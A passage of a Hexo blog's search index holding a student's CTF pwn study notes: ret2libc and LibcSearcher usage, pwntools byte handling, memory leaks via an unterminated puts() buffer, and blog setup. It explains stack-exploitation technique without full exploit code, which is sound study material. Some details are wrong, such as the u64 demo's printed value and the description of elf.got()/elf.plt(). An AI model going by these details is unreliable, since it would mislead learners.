    <link href="/2024/11/12/DSBCTF-%E5%81%9A%E4%B8%8D%E5%87%BA%E6%9D%A5%E7%9A%84%E7%AD%BE%E5%88%B0%E9%A2%98/"/>
    <url>/2024/11/12/DSBCTF-%E5%81%9A%E4%B8%8D%E5%87%BA%E6%9D%A5%E7%9A%84%E7%AD%BE%E5%88%B0%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>😭😭😭 做不出来签到</p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>发送字节码和字符串的区别</title>
    <link href="/2024/11/09/%E5%8F%91%E9%80%81%E5%AD%97%E8%8A%82%E7%A0%81%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2024/11/09/%E5%8F%91%E9%80%81%E5%AD%97%E8%8A%82%E7%A0%81%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<blockquote><p>ISCTF - girlfriend</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>io</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>令我困惑的一题：返回地址应该填啥？</title>
    <link href="/2024/11/05/%E4%BB%A4%E6%88%91%E5%9B%B0%E6%83%91%E7%9A%84%E4%B8%80%E9%A2%98%EF%BC%9A%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E5%BA%94%E8%AF%A5%E5%A1%AB%E5%95%A5%EF%BC%9F/"/>
    <url>/2024/11/05/%E4%BB%A4%E6%88%91%E5%9B%B0%E6%83%91%E7%9A%84%E4%B8%80%E9%A2%98%EF%BC%9A%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E5%BA%94%E8%AF%A5%E5%A1%AB%E5%95%A5%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<blockquote><p>总结：不囫囵吞枣，gdb调试见真知</p></blockquote><p>平台：buuctf<br> 题目：jarvisoj_test_your_memory<br>hexo</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>再探GOT&amp;PLT及延迟绑定</title>
    <link href="/2024/11/04/%E5%86%8D%E6%8E%A2GOT-PLT%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/"/>
    <url>/2024/11/04/%E5%86%8D%E6%8E%A2GOT-PLT%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/</url>
    
    <content type="html"><![CDATA[<p>之前刚学完GOT&amp;PLT及延迟绑定，转头用的时候就感觉变得有点陌生，<br>看来还是得把详细的过程和分析总结写下来呀。</p><p>先挖个坑，有空就写</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>程序</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ret2libc</title>
    <link href="/2024/11/04/ret2libc/"/>
    <url>/2024/11/04/ret2libc/</url>
    
    <content type="html"><![CDATA[<p>hexo</p><h3 id="什么样的题是ret2libc，这类题该怎么做？"><a href="#什么样的题是ret2libc，这类题该怎么做？" class="headerlink" title="什么样的题是ret2libc，这类题该怎么做？"></a>什么样的题是ret2libc，这类题该怎么做？</h3><p>程序的特征是：<br><strong>能</strong>进行栈<strong>溢出</strong>，没有<code>system</code>函数，也没有<code>&quot;/bin/sh&quot;</code>参数<br>无法进行常规的ret2text<br>ret2libc的关键是获取libc的版本，所以需要获得<code>libc.so</code>中函数的偏移量，<br>所以<strong>需要</strong>一个<strong>输出函数</strong>，<code>.got.plt</code>中需要有<strong>libc中的函数</strong>，我们才能获取到libc中函数的<strong>真实地址</strong></p><p>从而利用<strong>LibcSearcher</strong>确定libc版本</p><hr><p>LibcSearcher原理？<br>基地址范围？</p><hr><p>前置知识：<br>libc中有<code>system</code>函数，而<code>libc.so</code>动态偏移链接库中的函数之间的相对偏移是固定的</p><p>ALSR保护不会随机内存地址的后12位（后3个字节）</p><p><code>pwntools</code>基本语法：<br><code>elf.got()</code>返回的是<code>.got</code>中函数 相对plt基地址的偏移量<br><code>elf.plt()</code>返回的是<code>.plt</code>中函数 相对got基地址的偏移量</p><hr><h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><p><code>write()</code>函数是C标准库（libc）中的一个系统调用，常用于向文件描述符写入数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> count)</span>;<br></code></pre></td></tr></table></figure><h6 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h6><ol><li><code>fd</code> ：目标文件描述符<br>常见：</li></ol><ul><li><code>0</code>：标准输入</li><li><code>1</code>：标准输出</li><li><code>2</code>：标准错误输出</li><li><code>open</code>系统调用获取文件描述符</li></ul><ol start="2"><li><code>buf</code>：源数据缓冲区</li><li><code>count</code>：要写入的<strong>字节数</strong></li></ol><h6 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h6><ul><li>成功 返回写入的字节数</li><li>失败 返回-1</li></ul><hr><h1 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h1><h6 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h6><p>原版接口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>obj = LibcSearcher(<span class="hljs-string">&quot;fgets&quot;</span>,<span class="hljs-number">0x7ff39014bd90</span>)  <span class="hljs-comment"># 使用一个已知符号地址作为初始约束，初始化LibcSearcher</span><br>obj.add_condition(<span class="hljs-string">&quot;atoi&quot;</span>, <span class="hljs-number">218528</span>)  <span class="hljs-comment"># 添加一个约束条件</span><br>obj.dump(<span class="hljs-string">&quot;printf&quot;</span>)  <span class="hljs-comment"># 根据已有约束条件，查询某个符号在Libc中的地址(偏移量)</span><br></code></pre></td></tr></table></figure><p>新增接口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">len</span>(obj)  <span class="hljs-comment"># 返回在当前约束条件下，可能的Libc数量</span><br><span class="hljs-built_in">print</span>(obj)  <span class="hljs-comment"># 若Libc已被唯一确定，打印其详细信息</span><br><br><span class="hljs-keyword">for</span> libc <span class="hljs-keyword">in</span> obj:<br><span class="hljs-built_in">print</span>(libc)  <span class="hljs-comment"># 实现了迭代器，打印（或其他操作）当前所有可能的Libc</span><br><br>obj.select_libc()  <span class="hljs-comment"># 打印可能的Libc列表，手动选择一个认为正确的Libc</span><br>obj.select_libc(<span class="hljs-number">2</span>)  <span class="hljs-comment"># 手动选择2号Libc作为正确的Libc</span><br></code></pre></td></tr></table></figure><p>如果未知libc版本，在本地泄漏libc版本和在远程泄漏libc版本是不同的!<br>因为在本地程序运行时加载的是本地的libc版本！<br>LibcSearcher找到的也是本地的libc版本！</p><p>找不到正确的libc可以<code>add_condition</code>添加限制条件</p><blockquote><p>经典例题：ctfshow pwn107</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ret2xx</tag>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python与pwntools基本使用</title>
    <link href="/2024/11/04/python%E4%B8%8Epwntools%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <url>/2024/11/04/python%E4%B8%8Epwntools%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本片文章旨在总结成长为一名合格的pwn手必须要熟练掌握的python语法知识</p></blockquote><h1 id="操作字符串-字节流"><a href="#操作字符串-字节流" class="headerlink" title="操作字符串&#x2F;字节流"></a>操作字符串&#x2F;字节流</h1><hr><h2 id="截取字符串-字节对象"><a href="#截取字符串-字节对象" class="headerlink" title="截取字符串&#x2F;字节对象"></a>截取字符串&#x2F;字节对象</h2><hr><p>python没有单字符类型，只有字符串类型<br>python访问子字符串，可以用<code>[]</code>来截取字符串</p><p>字符串的截取语法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">变量[头下标:尾下标]<br></code></pre></td></tr></table></figure><p><img src="/2024/10/29/hello-world/ols%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/file-20250401234547157.png"></p><blockquote><p>更高级的操作可以搜索python序列操作：切片操作</p></blockquote><p>注意：<code>p64()</code>打包之后在<code>payload</code>中也可以进行截取操作，这是一个<code>partial write</code>操作技巧</p><p>注意：截取的下标是左闭右开的，即截取的子序列中，会包含头下标，不会包含尾下标，切取的 字符范围 是【头下标，尾下表-1】索引范围的字符</p><h2 id="左对齐和右对齐"><a href="#左对齐和右对齐" class="headerlink" title="左对齐和右对齐"></a>左对齐和右对齐</h2><hr><p>字符串的内置方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span>.ljust(width, fillchar)<br><span class="hljs-built_in">str</span>.rjust(width, fillchar)<br></code></pre></td></tr></table></figure><blockquote><p>如果<code>width</code>小于被操作字符串的长度，不会被操作，直接返回原字符串</p></blockquote><blockquote><p>小端序（little-endian）是一种字节序，它将低位字节存储在低地址处，高位字节存储在高地址处</p></blockquote><blockquote><p>发送字节流时是从低地址向高地址发送的，对应的数字型也是从低位到高位（小端序），所以向低位对齐、高位补0的操作常用<code>.ljust(width, fillchar)</code>方法</p></blockquote><p>因为pwntools的<code>u64()</code>、<code>u32()</code>等解包函数严格限制了字节流的长度，所以往往需要先截取字符串再进行对齐补全操作后解包成无符号数</p><h2 id="解包与打包"><a href="#解包与打包" class="headerlink" title="解包与打包"></a>解包与打包</h2><hr><blockquote><p>字节流转为<strong>无符号整数</strong> 无符号整数转为字节流</p></blockquote><p>默认情况下<code>u32()</code>、<code>u64()</code>等解包函数使用小端序，这与x86架构的默认字节序一致</p><p>demo:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 示例字节流</span><br>byte_stream = <span class="hljs-string">b&#x27;\x0c\xb0\xce\xfa\x00\x00\x00\x00&#x27;</span><br><br><span class="hljs-comment"># 使用 u64 转换为64位无符号整数</span><br>result = u64(byte_stream)<br><span class="hljs-built_in">print</span>(result)  <span class="hljs-comment"># 输出：4047627004</span><br></code></pre></td></tr></table></figure><h2 id="字符串-字节流拼接操作"><a href="#字符串-字节流拼接操作" class="headerlink" title="字符串&#x2F;字节流拼接操作"></a>字符串&#x2F;字节流拼接操作</h2><hr><p><code>+</code> 、 <code>*</code>运算符</p><h2 id="int-函数"><a href="#int-函数" class="headerlink" title="int()函数"></a>int()函数</h2><hr><blockquote><p>python中非常高级强大的一个函数</p></blockquote><p>将字符串、字节序列（bytes）、数字类型转换为（十进制）整数，最主要使用的是将字符串转换为整数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span>(x, base=<span class="hljs-number">10</span>)<br></code></pre></td></tr></table></figure><p>x：要转换的值<br>base：被转换值的进制数</p><hr><h1 id="python语法之字典"><a href="#python语法之字典" class="headerlink" title="python语法之字典"></a>python语法之字典</h1><hr><hr><h1 id="python语法之模块化编程"><a href="#python语法之模块化编程" class="headerlink" title="python语法之模块化编程"></a>python语法之模块化编程</h1><hr><p><code>import</code></p><p><code>from ... import ... </code></p><p><code>from ... import ... as ...</code></p><h1 id="python语法之关键字try"><a href="#python语法之关键字try" class="headerlink" title="python语法之关键字try"></a>python语法之关键字try</h1><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment"># 可能引发异常的代码</span><br><span class="hljs-keyword">except</span> 异常类型<span class="hljs-number">1</span>:<br>    <span class="hljs-comment"># 处理异常类型1的代码</span><br><span class="hljs-keyword">except</span> (异常类型<span class="hljs-number">2</span>, 异常类型<span class="hljs-number">3</span>):<br>    <span class="hljs-comment"># 处理异常类型2和3的代码</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment"># 如果没有发生异常，执行此代码</span><br><span class="hljs-keyword">finally</span>:<br>    <span class="hljs-comment"># 无论是否发生异常，都会执行此代码</span><br></code></pre></td></tr></table></figure><p>python跳出循环的语法：break</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>):<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><hr><h1 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h1><hr><p>libc常见的地址前缀：</p><ul><li><code>0x7f</code>：现代<code>linux</code>系统中最常见的<code>libc</code>地址结构。</li><li><code>0xf7</code>：在一些较老的系统或特定的配置中，<code>libc</code> 地址可能以 <code>0xf7</code> 开头</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">data = io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)<br></code></pre></td></tr></table></figure><p>去掉高位的0<br>32位系统中libc有效地址常常4个字节<br>64位系统中libc有效地址常常6个字节</p><p>若启用ASLR，<code>libc</code>基地址会在运行时随机化，但范围大致固定：</p><ul><li>32位：<code>0xb7000000</code> ~ <code>0xf7000000</code>。</li><li>64位：<code>0x7f0000000000</code> ~ <code>0x7ffffffff000</code>。</li></ul><p><a href="https://blog.csdn.net/2302_77659150/article/details/143392879">写给自己：pwn常用工具使用说明-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>puts函数</title>
    <link href="/2024/11/01/puts%E5%87%BD%E6%95%B0/"/>
    <url>/2024/11/01/puts%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>做了一个赣ctf上的题，没想到这漏洞如此简单我竟然没发现，真是浅薄了，<br>在此记录一下</p><p><code>puts()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">puts</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s)</span>;<br></code></pre></td></tr></table></figure><p><code>puts()</code>函数的作用是持续输出字符指针<code>s</code>指向的字符，直到遇到空字符<code>\0</code>为止，</p><p>假设<code>char s[256]</code>中<code>s</code>指向的内容是由用户输入的</p><p>那么用户可以输入一个长度超过256的字符串<br>即使机器只读取前256个字符，那么也会导致<code>s[256]</code>中没有<code>\0</code>字符，</p><p>从而使puts持续输出s以及s之后的内存内容（以字符串的形式），直到遇到<code>\0</code>为止</p><p>从而造成内存泄漏</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>泄漏信息</tag>
      
      <tag>glibc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>obsidian+hexo方案解决图片显示问题</title>
    <link href="/2024/10/30/obsidian-hexo%E8%A7%A3%E5%86%B3%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/"/>
    <url>/2024/10/30/obsidian-hexo%E8%A7%A3%E5%86%B3%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>建立博客后遇到的第一个问题就是hexo上的图片显示问题</p><hr><p>想到一种考虑，把图片全都放在一个文件夹里试试<br>挖个坑<br>有空试试</p><p>测试图片</p><p>测试失败</p><p>测试图片2</p><p>好，试过了，确实不行<br>现有obsidian设置和hexo设置无法满足这个要求</p><hr><p>只有原先上面的方法是行的（目前最优）</p><p>成功</p><p>但可以考虑设置<code>_config.yml</code>：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">post_asset_folder:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>这样在<code>hexo new post &lt;name&gt;</code>时，就不会再多创建一个可能用不到的资源文件夹<br>在obsidian中粘贴时自动创建即可</p><p>注意：<br>obsidian插件<code>Custom Attachment Loaction</code>设置中附件的命名问题</p><hr><p>发现：<br>排在前面的url错误的图片竟然也会影响后面的所有图片，使后面的图片显示不出来</p><hr><p>md，还是得改成true</p><p>和插件设置中附件文件夹中文件的命名倒是没关系<br>和属性中的title也没关系</p><p>甚至和文件、文件夹的命名也没关系，只要合法且对应即可</p><hr><p><img src="/2024/10/29/hello-world/o%E8%A7%A3%E5%86%B3%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/file20241105202739043.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>建站</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>new_article</title>
    <link href="/2024/10/29/new-article/"/>
    <url>/2024/10/29/new-article/</url>
    
    <content type="html"><![CDATA[<h1 id="这是一篇测试文h"><a href="#这是一篇测试文h" class="headerlink" title="这是一篇测试文h"></a>这是一篇测试文h</h1><p>使用hexo的步骤</p><p>新建about页：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">hexo new page about<br></code></pre></td></tr></table></figure><p>添加layout</p><p>新建文章</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">hexo new post new_article<br></code></pre></td></tr></table></figure><h1 id="test"><a href="#test" class="headerlink" title="test"></a>test</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">marked:</span><br>  <span class="hljs-attr">prependRoot:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">postAsset:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>再试？</p><p><img src="/2024/10/29/hello-world/file-20241105202749069.png"></p><p>将文章发布到github：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">hexo g -d<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/10/29/hello-world/"/>
    <url>/2024/10/29/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ hexo g -d<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>chore</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
